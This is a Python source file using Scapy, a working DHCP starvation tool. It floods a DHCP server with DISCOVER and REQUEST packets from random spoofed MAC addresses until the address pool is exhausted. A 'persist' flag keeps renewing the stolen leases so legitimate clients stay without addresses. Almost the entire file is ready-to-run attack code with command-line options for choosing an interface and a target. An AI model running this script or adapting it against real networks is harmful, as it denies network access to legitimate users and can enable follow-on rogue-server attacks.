from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import argparse
import threading


# global variables initialized with default
iface = conf.iface
# in case no ip target was inserted - attack anyone (broadcast address)
target = "255.255.255.255"
# in case no IP received in max_waiting_time - break!
max_waiting_time = 10
# enable persist attack on server
persist_attack = False
# store mac address info as global
src_mac = get_if_hwaddr(iface)


# option to send packet specific
def send_dhcp_discover(mac):
    dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast address
    fake_mac = mac
    options = [("message-type", "discover"),
               ("max_dhcp_size", 1500),
               ("client_id", fake_mac),
               ("lease_time", 10000),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = (Ether(src=src_mac, dst=dst_mac)
                    / IP(src="0.0.0.0", dst=target)
                    / UDP(sport=68, dport=67)
                    / BOOTP(chaddr=[fake_mac], xid=transaction_id, flags=0xFFFFFFFF)
                    / DHCP(options=options))
    sendp(dhcp_request, iface=iface, verbose=False)


def sniff_dhcp_offer():
    return sniff(1, filter="udp and (port 67 or 68)", timeout=max_waiting_time)[0]


def send_dhcp_request(req_addr, mac):
    dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast address
    fake_mac = mac
    options = [("message-type", "request"),
               ("max_dhcp_size", 1500),
               ("client_id", fake_mac),
               ("lease_time", 10000),
               ("requested_addr", req_addr),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = (Ether(src=src_mac, dst=dst_mac)
                    / IP(src='0.0.0.0', dst=target)
                    / UDP(sport=68, dport=67)
                    / BOOTP(chaddr=[fake_mac], xid=transaction_id, flags=0xFFFFFFFF)
                    / DHCP(options=options))
    sendp(dhcp_request, iface=iface, verbose=False)


def send_dhcp_renew_address(info):
    dst_mac = info['srv_mac']  # Broadcast address
    fake_mac = info['fake_mac']
    options = [("message-type", "request"),
               ("max_dhcp_size", 1500),
               ("client_id", fake_mac),
               ("lease_time", 10000),
               ("server_id", info['srv_id']),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = (Ether(src=src_mac, dst=dst_mac)
                    / IP(src=info['taken_ip'], dst=info['srv_ip'])
                    / UDP(sport=68, dport=67)
                    / BOOTP(chaddr=[fake_mac], ciaddr=info['taken_ip'], xid=transaction_id, flags=0x0)
                    / DHCP(options=options))
    sendp(dhcp_request, iface=iface, verbose=False)


def parse_flags():
    global target, iface, persist_attack, src_mac
    parser = argparse.ArgumentParser()
    # insert the args variables to CLI for help
    parser.add_argument("-i", "--iface", help="The interface you wish to use")
    parser.add_argument("-t", "--target", help="IP of target server")
    parser.add_argument("-p", "--persist", action="store_true", help="activate persistent attack")
    args = parser.parse_args()

    if args.iface:
        iface = args.iface
    src_mac = get_if_hwaddr(iface)
    if args.target:
        target = args.target
    persist_attack = args.persist


def renew_dhcp_connection(timer, info):
    threading.Timer(timer, renew_dhcp_connection, args=[timer, info]).start()
    send_dhcp_renew_address(info)
    print(f"renewed address {info['taken_ip']} . renewing again in {timer} sec")


def dhcp_connection():
    mac = str(RandMAC())
    send_dhcp_discover(mac)
    try:
        p = sniff_dhcp_offer()
        r = p[BOOTP].yiaddr
        # in case a 0.0.0.0 - error from the server
        if r == "0.0.0.0":
            return None
        send_dhcp_request(r, mac)
        # get the amount of lease time from packet
        # and raise this function whenever it expired in order to
        # keep the persist attack
        if persist_attack:
            timeout = p[DHCP].options[2][1] / 2
            info = {'srv_mac': p[Ether].src,
                    'srv_ip': p[IP].src,
                    'fake_mac': mac,
                    'taken_ip': r,
                    'srv_id': p[DHCP].options[1][1], }
            threading.Timer(timeout, renew_dhcp_connection, args=[timeout, info]).start()

        return r
    except:
        return None


def main():
    parse_flags()
    while addr := dhcp_connection():
        print(f"got address {addr}")
    print("IP pool seems to be finished")
    # print(dhcp_connection())


main()
